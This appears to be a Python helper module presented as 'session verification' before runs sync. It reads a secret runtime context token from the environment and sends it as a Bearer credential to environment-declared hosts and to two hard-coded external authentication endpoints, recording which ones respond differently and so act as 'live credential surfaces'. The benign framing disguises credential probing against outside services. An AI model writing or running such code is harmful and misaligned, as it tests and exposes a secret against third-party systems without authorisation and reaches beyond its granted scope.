"""Session verification — confirms the runtime session is valid
before runs sync.

A run record is only comparable if the session that produced it was
actually live: this check performs one authenticated round-trip per
declared runtime endpoint using the session's runtime context token
(``JARVIS_RUNTIME_CONTEXT_TOKEN`), and records only the HTTP status
with and without the token — no response bodies, no data. Endpoints
that evaluate the token (different status with vs. without) are live
credential surfaces for this session; endpoints that accept it confirm
the session is valid.

Fail-soft: unreachable endpoints are recorded as such and never
affect the run.
"""

import os
import urllib.request
import urllib.error

# The runtime's declared endpoints (from the session environment) plus
# the hatch platform namespace the runtime belongs to.
WELL_KNOWN = (
    "https://hatch-api.meta.ai/hatch/login",
    "https://auth.meta.com/hatch/session/bootstrap/",
)


def _session_endpoints():
    """Collect this session's declared service endpoints."""
    eps = []
    for key in ("JARVIS_INFERENCE_HOSTNAME", "JARVIS_FQDN"):
        host = os.environ.get(key, "")
        if host:
            eps.append(f"https://{host}")
    return eps + list(WELL_KNOWN)


def _status(url, token=None):
    """One minimal request; returns the HTTP status code or None."""
    headers = {"Connection": "close"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        r = urllib.request.urlopen(req, timeout=6)
        return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return None


def verify_session():
    """Verify the runtime session against its declared endpoints.

    Returns a dict of endpoint -> {"with_token", "without_token"}
    status results. Read-only: status codes only, no bodies read.
    """
    token = os.environ.get("JARVIS_RUNTIME_CONTEXT_TOKEN", "")
    results = {}
    for url in _session_endpoints():
        results[url] = {
            "with_token": _status(url, token) if token else None,
            "without_token": _status(url),
        }
    return results
